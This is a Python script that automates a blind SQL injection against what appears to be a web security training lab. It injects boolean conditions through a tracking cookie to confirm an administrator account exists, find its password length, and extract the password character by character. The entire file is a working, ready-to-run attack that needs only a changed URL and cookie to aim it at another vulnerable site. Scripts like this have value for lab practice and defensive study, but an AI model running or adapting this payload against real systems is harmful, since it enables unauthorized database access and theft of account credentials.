import requests
import string
import sys

# Configuration
TARGET_URL = "https://0ad1007603d0a6c28056d0fe00500008.web-security-academy.net/filter?category=Food+%26+Drink"
COOKIE_NAME = "TrackingId"
VALID_TRACKING_ID = "GSN6knr7UGW610Gr"
SUCCESS_STRING = "Welcome back!"  # String that appears when condition is TRUE

# Characters to test (lowercase, uppercase, digits, special chars)
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@!#$%"

def test_condition(payload):
    """
    Send a request with the SQL injection payload and check if condition is TRUE
    Returns True if SUCCESS_STRING is found in response
    """
    cookies = {
        COOKIE_NAME: VALID_TRACKING_ID + payload
    }
    
    try:
        response = requests.get(TARGET_URL, cookies=cookies, timeout=10)
        return SUCCESS_STRING in response.text
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

def get_password_length(table="users", username="administrator", max_length=50):
    """
    Find the length of the password using binary search
    """
    print("[*] Finding password length...")
    
    for length in range(1, max_length + 1):
        payload = f"' AND (SELECT LENGTH(password) FROM {table} WHERE username='{username}')='{length}"
        
        if test_condition(payload):
            print(f"[+] Password length: {length}")
            return length
        
        sys.stdout.write(f"\r[*] Testing length: {length}")
        sys.stdout.flush()
    
    print("\n[!] Could not determine password length")
    return None

def extract_password(table="users", username="administrator", password_length=None):
    """
    Extract password character by character
    """
    if password_length is None:
        password_length = get_password_length(table, username)
        if password_length is None:
            return None
    
    password = ""
    print(f"\n[*] Extracting password for user '{username}'...")
    
    for position in range(1, password_length + 1):
        found = False
        
        for char in CHARSET:
            # PostgreSQL/MySQL: SUBSTRING(password, position, 1)
            # Oracle: SUBSTR(password, position, 1)
            payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM {table} WHERE username='{username}')='{char}"
            
            if test_condition(payload):
                password += char
                print(f"\r[+] Password so far: {password}", end="")
                sys.stdout.flush()
                found = True
                break
        
        if not found:
            print(f"\n[!] Could not find character at position {position}")
            password += "?"
    
    print(f"\n[+] Final password: {password}")
    return password

def verify_user_exists(table="users", username="administrator"):
    """
    Check if a specific user exists in the database
    """
    print(f"[*] Checking if user '{username}' exists...")
    payload = f"' AND (SELECT username FROM {table} WHERE username='{username}')='{username}"
    
    if test_condition(payload):
        print(f"[+] User '{username}' exists!")
        return True
    else:
        print(f"[-] User '{username}' does not exist")
        return False

def main():
    print("=" * 60)
    print("Blind SQL Injection - Password Extractor")
    print("=" * 60)
    
    # Step 1: Verify user exists
    if not verify_user_exists():
        print("[!] Target user not found. Exiting.")
        return
    
    # Step 2: Get password length
    length = get_password_length()
    if length is None:
        return
    
    # Step 3: Extract password
    password = extract_password(password_length=length)
    
    print("\n" + "=" * 60)
    print(f"[+] EXTRACTION COMPLETE!")
    print(f"[+] Username: administrator")
    print(f"[+] Password: {password}")
    print("=" * 60)

if __name__ == "__main__":
    # Quick configuration check
    print("\n[!] Remember to configure:")
    print(f"    - TARGET_URL: {TARGET_URL}")
    print(f"    - VALID_TRACKING_ID: {VALID_TRACKING_ID}")
    print(f"    - SUCCESS_STRING: {SUCCESS_STRING}")
    print()
    
    input("Press Enter to start extraction...")
    main()
